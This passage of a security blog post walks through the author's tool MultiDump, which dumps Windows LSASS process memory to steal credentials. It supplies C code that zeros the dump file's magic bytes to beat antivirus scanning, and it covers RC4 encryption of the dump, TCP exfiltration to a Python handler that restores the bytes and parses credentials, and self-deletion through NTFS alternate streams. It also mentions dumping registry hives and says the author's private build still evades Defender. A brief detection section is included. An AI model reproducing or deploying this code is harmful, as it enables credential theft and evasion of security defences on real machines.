+</span></span></code></pre></div><p>We can see that the LSASS dump command is well hidden in both Process Explorer and <a href="https://processhacker.sourceforge.io/" target="_blank" rel="noopener noreferrer">Process Hacker</a>:</p>
+<div class="image-container">
+
+
+
+
+
+<img src="https://Xre0uS.io/img/comsvcs-pex-args-hidden.png" alt="comsvcs-pex-args-hidden.png" class="flexible-image img-size-L">
+
+
+
+
+
+
+
+<img src="https://Xre0uS.io/img/procdump-pex-args-hidden.png" alt="procdump-pex-args-hidden.png" class="flexible-image img-size-L">
+
+
+</div>
+<p>Now, we can simply resume the process, collect the dump and call it a day.</p>
+<h2 id="the-magic-bytes">The Magic Bytes</h2>
+<div class="image-container">
+
+
+
+
+
+<img src="https://Xre0uS.io/img/defender-lsass-dump.png" alt="defender-lsass-dump.png" class="flexible-image img-size-M">
+
+
+</div>
+<p>Not quite. While the command executed without problem and created a dump file, the output file still gets detected by defender. To prevent the dump file from being detected by AVs, simply zero out the first 6 bytes, <code>4D 44 4D 50 93 A7</code>, of the file. This action removes the magic bytes, which are typically used by AVs for signature-based detection. By changing these bytes to <code>00 00 00 00 00 00</code>, the file’s signature is obscured, making it less likely to trigger antivirus alerts. It is a straightforward workaround to bypass detection mechanisms, focusing on changing identifiable file patterns without affecting the entire file.</p>
+<div class="image-container">
+
+
+
+
+
+<img src="https://Xre0uS.io/img/lsass-dump-magic-bytes.png" alt="lsass-dump-magic-bytes.png" class="flexible-image img-size-M">
+
+
+
+
+
+
+
+<img src="https://Xre0uS.io/img/lsass-dump-magic-bytes-rm.png" alt="lsass-dump-magic-bytes-rm.png" class="flexible-image img-size-M">
+
+
+</div>
+<p>To evade antivirus detection, modifying the dump file’s magic bytes to zeros immediately after creation is important. This makes the file type difficult to recognise right away, which significantly reduces detection risks.</p>
+<p>The operation’s success depends on its speed: modifying the first 6 bytes must be done quickly, before the AV scans the file. Since the modification is both simple and targeted, it can be executed almost instantaneously. We also have the advantage of knowing exactly when and where the file would be created, which helps to beat AVs to the punch. This method ensures the program stays ahead of antivirus scanning, utilising a quick, preemptive modification to avoid detection.</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL ZeroOutBytes(<span style="color:#fff;font-weight:bold">const</span> <span style="color:#fff;font-weight:bold">char</span>* filePath, <span style="color:#fff;font-weight:bold">size_t</span> numberOfBytes) {
+</span></span><span style="display:flex;"><span>    HANDLE hFile = CreateFileA(
+</span></span><span style="display:flex;"><span>        filePath,
+</span></span><span style="display:flex;"><span>        GENERIC_WRITE,
+</span></span><span style="display:flex;"><span>        <span style="color:#ff0;font-weight:bold">0</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">NULL</span>,
+</span></span><span style="display:flex;"><span>        OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>        FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">NULL</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (hFile == INVALID_HANDLE_VALUE) {
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> FALSE;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">char</span>* zeroBuffer = (<span style="color:#fff;font-weight:bold">char</span>*)malloc(numberOfBytes);
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (zeroBuffer == <span style="color:#fff;font-weight:bold">NULL</span>) {
+</span></span><span style="display:flex;"><span>        CloseHandle(hFile);
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> FALSE;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    ZeroMemory(zeroBuffer, numberOfBytes);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    DWORD bytesWritten;
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (!WriteFile(hFile, zeroBuffer, (DWORD)numberOfBytes, &amp;bytesWritten, <span style="color:#fff;font-weight:bold">NULL</span>)) {
+</span></span><span style="display:flex;"><span>        CloseHandle(hFile);
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> FALSE;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    CloseHandle(hFile);
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">for</span> (retryCount = <span style="color:#ff0;font-weight:bold">0</span>; retryCount &lt; <span style="color:#ff0;font-weight:bold">100000</span>; retryCount++) {
+</span></span><span style="display:flex;"><span>	<span style="color:#fff;font-weight:bold">if</span> (ZeroOutBytes(args.tempDmpPath, <span style="color:#ff0;font-weight:bold">6</span>)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#fff;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Other methods like <code>ReadDirectoryChanges</code> were tested but were found to be too slow. And even adding a <code>Sleep(1)</code> will increase detection rates and cause failures, making simplicity the best approach.
+Some statistics against different system types:</p>
+<ul>
+<li>1000-2000 attempts for dump files of ~50MB on SSD</li>
+<li>5000-10000 attempts for dump files of ~150MB on SSD</li>
+<li>20000-50000 attempts for dump files of ~200MB on HDD</li>
+</ul>
+<p>Given these statistics, a limit of 100000 tries is set to prevent the loop from consuming excessive CPU resources indefinitely. If the target file is still not found after reaching this threshold, it’s likely either flagged by security measures or wasn’t generated at all. The loop is designed to terminate after roughly one second to maintain system performance.</p>
+<p>If the dump is successful and the magic bytes are zeroed, the file is loaded into memory, a unique 64-byte key is generated for encrypting the data. The encryption employs the RC4 algorithm via the <code>SystemFunction032</code> function mentioned earlier. After encryption, the original dump file is deleted to cover the our tracks.</p>
+<p>If MultiDump is running in local mode, the encrypted dump file is written to the disk and the key is printed on screen.</p>
+<h2 id="the-handler--remote-mode">The Handler &amp; Remote Mode</h2>
+<p>MultiDump also supports exfiltrating the data over the network, with a handler to receive and decrypt the data. Similarly, the handler can also be used to decrypt the local dump file.</p>
+<p>Two separate TCP streams are initiated, first to deliver the key, second to deliver the dump data.</p>
+<p>To protect the key in transport over the network, it is also encrypted, this time with the integer representation of the handler’s IP and port:</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL ParseIPAndPort(<span style="color:#fff;font-weight:bold">const</span> <span style="color:#fff;font-weight:bold">char</span>* address, <span style="color:#fff;font-weight:bold">char</span>* ip, <span style="color:#fff;font-weight:bold">int</span>* port, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">__int64</span>* combinedKey) {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">char</span>* tempAddress = _strdup(address);
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (!tempAddress) {
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> FALSE;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">char</span>* colon = strchr(tempAddress, <span style="color:#0ff;font-weight:bold">':'</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (colon) {
+</span></span><span style="display:flex;"><span>        *colon = <span style="color:#0ff;font-weight:bold">'\0'</span>;
+</span></span><span style="display:flex;"><span>        strncpy(ip, tempAddress, <span style="color:#ff0;font-weight:bold">15</span>);
+</span></span><span style="display:flex;"><span>        ip[<span style="color:#ff0;font-weight:bold">15</span>] = <span style="color:#0ff;font-weight:bold">'\0'</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        *port = atoi(colon + <span style="color:#ff0;font-weight:bold">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">struct</span> in_addr addr;
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (InetPtonA(AF_INET, ip, &amp;addr) == <span style="color:#ff0;font-weight:bold">1</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">long</span> ipNumeric = ntohl(addr.S_un.S_addr);
+</span></span><span style="display:flex;"><span>            *combinedKey = ((<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">__int64</span>)ipNumeric &lt;&lt; <span style="color:#ff0;font-weight:bold">16</span>) | (*port);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>            free(tempAddress);
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> FALSE;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>        free(tempAddress);
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> FALSE;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    free(tempAddress);
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The handler receives the key, and decrypt it using the detected IP, or it can be manually configured if the connection is over a proxy. The first connection has a limit of 1 KB to prevent unwanted connections, and the handler checks if the key is exactly 64 bytes.</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">def</span> generate_key(ip, port):
+</span></span><span style="display:flex;"><span>    ip_numeric = struct.unpack(<span style="color:#0ff;font-weight:bold">"!L"</span>, socket.inet_aton(ip))[<span style="color:#ff0;font-weight:bold">0</span>]
+</span></span><span style="display:flex;"><span>    key = (ip_numeric &lt;&lt; <span style="color:#ff0;font-weight:bold">16</span>) | <span style="color:#fff;font-weight:bold">int</span>(port)
+</span></span><span style="display:flex;"><span>    key_bytes = key.to_bytes(<span style="color:#ff0;font-weight:bold">8</span>, <span style="color:#0ff;font-weight:bold">"little"</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> key_bytes
+</span></span></code></pre></div><div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span> enc_dump_key, local_ip, key_bytes_received = start_server(
+</span></span><span style="display:flex;"><span>            args.remote, <span style="color:#0ff;font-weight:bold">"encrypted key"</span>, <span style="color:#ff0;font-weight:bold">1</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> <span style="color:#fff;font-weight:bold">len</span>(enc_dump_key) != <span style="color:#ff0;font-weight:bold">64</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">"[!] Key size mismatch!"</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span>
+</span></span></code></pre></div><p>If the key passes the check, the second connection is accepted with a limit of 500MB. The handler decrypts the data with the previously decrypted key. Due to RC4’s straightforward implementation in Python, this decryption process may take additional time. Following decryption, the handler verifies that the magic bytes are all zeros to confirm successful decryption, then restores the original magic bytes. Finally, the data is passed to <a href="https://github.com/skelsec/pypykatz" target="_blank" rel="noopener noreferrer">Pypykatz</a> to be parsed. This process is similar for a local file.</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">def</span> mod_magic_bytes(data):
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> data[:<span style="color:#ff0;font-weight:bold">6</span>] == <span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">"</span><span style="color:#0ff;font-weight:bold">\x00\x00\x00\x00\x00\x00</span><span style="color:#0ff;font-weight:bold">"</span>:
+</span></span><span style="display:flex;"><span>        replacement_bytes = <span style="color:#fff;font-weight:bold">bytes</span>.fromhex(<span style="color:#0ff;font-weight:bold">"4D 44 4D 50 93 A7"</span>)
+</span></span><span style="display:flex;"><span>        modified_data = replacement_bytes + data[<span style="color:#ff0;font-weight:bold">6</span>:]
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> modified_data
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">raise</span> Exception()
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>pypy_parse = pypykatz.parse_minidump_bytes(dump)
+</span></span></code></pre></div><p>If all goes well, the LSASS data will appear on the screen, with the option to save it.</p>
+<h2 id="other-evasion-techniques">Other Evasion Techniques</h2>
+<p>MultiDump employs a number of other techniques for better evasion.</p>
+<p>As mentioned previously, to evade string analysis, the static strings to dump LSASS are encrypted using RC4 is only decrypted when needed.</p>
+<p>Most of the output messages can be excluded from being compiled by commenting the following line in <code>Debug.h</code>:</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#007f7f">//#define DEBUG
+</span></span></span></code></pre></div><p>It can also be configured for self-deletion by uncommenting the following line in <code>Common.h</code>:</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#define SELF_DELETION
+</span></span></span></code></pre></div><p>To do this, MultiDump takes advantage of <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/c54dec26-1551-4d3a-a0ea-4fa40f848eb3" target="_blank" rel="noopener noreferrer">NTFS alternate data streams</a>, it first get a handle on the file itself, rename the default <code>:$DATA</code> stream using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfileinformationbyhandle" target="_blank" rel="noopener noreferrer"><code>SetFileInformationByHandle</code></a> function. The function requires the following parameters:</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL SetFileInformationByHandle(
+</span></span><span style="display:flex;"><span>  [in] HANDLE                    hFile,
+</span></span><span style="display:flex;"><span>  [in] FILE_INFO_BY_HANDLE_CLASS FileInformationClass,
+</span></span><span style="display:flex;"><span>  [in] LPVOID                    lpFileInformation,
+</span></span><span style="display:flex;"><span>  [in] DWORD                     dwBufferSize
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>We will need to set the <code>FileInformationClass</code> value to<a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfileinformationbyhandle#remarks" target="_blank" rel="noopener noreferrer"><code>FileRenameInfo</code></a> and the <code>lpFileInformation</code> should be a pointer to the following <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-file_rename_info" target="_blank" rel="noopener noreferrer"><code>FILE_RENAME_INFO</code></a> structure:</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">typedef</span> <span style="color:#fff;font-weight:bold">struct</span> _FILE_RENAME_INFO {
+</span></span><span style="display:flex;"><span>  <span style="color:#fff;font-weight:bold">union</span> {
+</span></span><span style="display:flex;"><span>    BOOLEAN ReplaceIfExists;
+</span></span><span style="display:flex;"><span>    DWORD   Flags;
+</span></span><span style="display:flex;"><span>  } DUMMYUNIONNAME;
+</span></span><span style="display:flex;"><span>  BOOLEAN ReplaceIfExists;
+</span></span><span style="display:flex;"><span>  HANDLE  RootDirectory;
+</span></span><span style="display:flex;"><span>  DWORD   FileNameLength;
+</span></span><span style="display:flex;"><span>  WCHAR   FileName[<span style="color:#ff0;font-weight:bold">1</span>];
+</span></span><span style="display:flex;"><span>} FILE_RENAME_INFO, *PFILE_RENAME_INFO;
+</span></span></code></pre></div><p>According to Microsoft, the <code>FileName</code> member is:</p>
+<blockquote>
+<p>A NUL-terminated wide-character string containing the new path to the file. The value can be one of the following:</p>
+<ul>
+<li>An absolute path (drive, directory, and filename).</li>
+<li>A path relative to the process’s current directory.</li>
+<li>The new name of an NTFS file stream, starting with <code>:</code>.</li>
+</ul>
+</blockquote>
+<p>MultiDump sets the alternate stream to <code>:ALT</code> by default, as defined in <code>Common.h</code>.</p>
+<p>Finally, after the data stream has been renamed, the original <code>:$DATA</code> stream can be deleted. The <code>SetFileInformationByHandle</code> is used again, this time, setting the <code>FileInformationClass</code> value to <code>FileDispositionInfo</code>, the <code>lpFileInformation</code> should be a pointer to the following <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-file_disposition_info" target="_blank" rel="noopener noreferrer"><code>FILE_DISPOSITION_INFO</code></a> structure:</p>
+<div class="highlight" style="opacity: 1;"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">typedef</span> <span style="color:#fff;font-weight:bold">struct</span> _FILE_DISPOSITION_INFO {
+</span></span><span style="display:flex;"><span>  BOOLEAN DeleteFile;
+</span></span><span style="display:flex;"><span>} FILE_DISPOSITION_INFO, *PFILE_DISPOSITION_INFO;
+</span></span></code></pre></div><p>By setting <code>DeleteFile</code> to <code>TRUE</code>, the file can be deleted.</p>
+<h2 id="defending-and-detecting">Defending and Detecting</h2>
+<p>As the command line is modified by directly changing the PEB structure in memory, it can be quite difficult to detect it on startup. However, the biggest weakness of this technique is that a <code>.dmp</code> file will be written to disk, even though it is quickly read and deleted, it is possible to pause the execution to analyse the output.</p>
+<p>While <code>ProcDump.exe</code> and <code>rundll32.exe</code> are legitimate binaries, an unknown program creating a child process to execute them is highly suspicious, and it should be placed under extra monitoring.</p>
+<p>Additionally, outbound connections from such a program could further raise suspicions.</p>
+<p>Together, these indicators - temporary file creation, unusual binary usage, and network traffic, should be cause for concern and suggest the need for increased monitoring.</p>
+<h2 id="updates">Updates</h2>
+<p>I have added an option for MultiDump to dump <code>SAM</code>, <code>SECURITY</code> and <code>SYSTEM</code> hives, since Defender does not care if the hives were dumped, so this is more of a convenience feature to make post exploit information gathering easier.</p>
+<p>For a follow up investigation that led to a fix against Windows Defender, check out this <a href="https://xre0us.io/posts/saving-lsass-from-defender/">blog post</a>.</p>
+<p>As of 26th February, MultiDump compiled with the default options is detected by Defender (finally), expected since it’s released as an open source project, still took a while though. It even got its own name, I take this as a win.</p>
+<p>My own version of MultiDump is not detected and works fine, so I have reasons to believe that it’s a basic signature detection and techniques used still works.</p>
+<div class="image-container">
+
+
+
+
+
+<img src="https://Xre0uS.io/img/multidump-detected.png" alt="multidump-detected.png" class="flexible-image img-size-M">
+
+
+</div>
+<h2 id="testing-against-other-avs">Testing Against Other AVs</h2>
+<div class="image-container">
+
+
+
+
+
+<img src="https://Xre0uS.io/img/multidump-eset.gif" alt="multidump-eset.gif" class="flexible-image img-size-F">
+
+
+
+
+
+
+
+<img src="https://Xre0uS.io/img/multidump-malwarebytes.gif" alt="multidump-malwarebytes.gif" class="flexible-image img-size-F">
+
+
+
+
+
+
+
+<img src="https://Xre0uS.io/img/multidump-mcafee.gif" alt="multidump-mcafee.gif" class="flexible-image img-size-F">
+
+
+</div>
+<hr>
+<p>Credits:</p>
+<ul>
+<li>Some techniques used learnt from <a href="https://maldevacademy.com" target="_blank" rel="noopener noreferrer">MalDev Academy</a>, it is an awesome course, highly recommended</li>
+<li>Inspired by <a href="https://github.com/djackreuter/proc_noprocdump" target="_blank" rel="noopener noreferrer">proc_noprocdump</a></li>
+<li>Code to further process LSASS dump from <a href="https://github.com/Hackndo/lsassy" target="_blank" rel="noopener noreferrer">lsassy</a></li>
+<li>Testing and suggestions from <a href="https://github.com/ballro" target="_blank" rel="noopener noreferrer">ballro</a></li>
+<li>Testing and suggestions from <a href="https://github.com/DisplayGFX" target="_blank" rel="noopener noreferrer">DisplayGFX</a>, <a href="https://github.com/nthdeg" target="_blank" rel="noopener noreferrer">nthdeg</a> and silentbee</li>
+</ul>
+
+        </div>
+    </article>
+
+    <hr>
+
+    <div class="post-info">
+        
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://Xre0uS.io/tags/tools/">tools</a></span>
+        <span class="tag"><a href="https://Xre0uS.io/tags/c/">C</a></span>
+        <span class="tag"><a href="https://Xre0uS.io/tags/python/">Python</a></span>
+        
+    </p>
+
+        
+
+        <p>
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                <polyline points="14 2 14 8 20 8"></polyline>
+                <line x1="16" y1="13" x2="8" y2="13"></line>
+                <line x1="16" y1="17" x2="8" y2="17"></line>
+                <polyline points="10 9 9 9 8 9"></polyline>
+            </svg>
+            2893 Words
+        </p>
+    </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://Xre0uS.io/posts/saving-lsass-from-defender/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">Saving LSASS From Windows Defender</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="https://Xre0uS.io/posts/cpts-oscp-and-you/">
+                    <span class="button__text">CPTS, OSCP &amp; You</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+
+</main>
+
+        </div>
+        
+        <footer class="footer">
+    
+    
+</footer>
+
+        
+    </div>
+
+    
+
+
+
+<script type="text/javascript" src="https://Xre0uS.io/bundle.min.46e438bd2eca7eb6358c700b40f6f56b22ab0b92503ecc11a2d8e4bcc610b8b4da83e5ea3d3e84fdb5f3c3c765744b9f5bbaf43cf5a027910be07ee39a9c12a1.js" integrity="sha512-RuQ4vS7KfrY1jHALQPb1ayKrC5JQPswRotjkvMYQuLTag+XqPT6E/bXzw8dldEufW7r0PPWgJ5EL4H7jmpwSoQ=="></script>
+
+
+
+
+
+    <button id="scrollToTopButton" onclick="scrollToTop()" style="display: none; position: fixed; bottom: 20px; right: 30px; z-index: 99;">
+        
+        <svg fill="#acacac" height="20px" width="20px" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 330 330" xml:space="preserve" style="--darkreader-inline-fill: #acacac;" data-darkreader-inline-fill="">
+            <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+            <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
+            <g id="SVGRepo_iconCarrier">
+                <path id="XMLID_224_" d="M325.606,229.393l-150.004-150C172.79,76.58,168.974,75,164.996,75c-3.979,0-7.794,1.581-10.607,4.394 l-149.996,150c-5.858,5.858-5.858,15.355,0,21.213c5.857,5.857,15.355,5.858,21.213,0l139.39-139.393l139.397,139.393 C307.322,253.536,311.161,255,315,255c3.839,0,7.678-1.464,10.607-4.394C331.464,244.748,331.464,235.251,325.606,229.393z">
+                </path>
+            </g>
+        </svg>
+        
+    </button>
+
+    
+    <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;dac71ec2cff8464da8e2799442495229&quot;}"></script>
+    
+
+
+</body></html>
